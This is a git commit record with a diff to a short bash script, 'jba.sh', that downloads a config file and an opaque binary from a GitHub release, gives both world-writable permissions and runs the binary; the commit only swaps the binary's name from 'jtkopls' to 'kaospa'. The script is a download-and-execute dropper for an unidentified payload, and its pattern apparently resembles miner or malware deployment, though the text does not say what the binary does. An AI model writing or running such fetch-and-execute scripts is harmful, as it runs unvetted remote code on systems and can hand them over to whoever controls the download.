55d2f04242954a78846986b02d02098048864ea8
vedhagsvp <vedhag230223@gmail.com>
2025-09-09 03:17:31 +0530

    Update jba.sh

--- jba.sh
+++ jba.sh
@@ -1,6 +1,6 @@
 #!/bin/bash
 
 wget https://github.com/vedhagsvp/taberas/raw/main/appsettings.json
-wget https://github.com/vedhagsvp/taberas/releases/download/mlb/jtkopls
-chmod 777 jtkopls appsettings.json
-./jtkopls
+wget https://github.com/vedhagsvp/taberas/releases/download/mlb/kaospa
+chmod 777 kaospa appsettings.json
+./kaospa
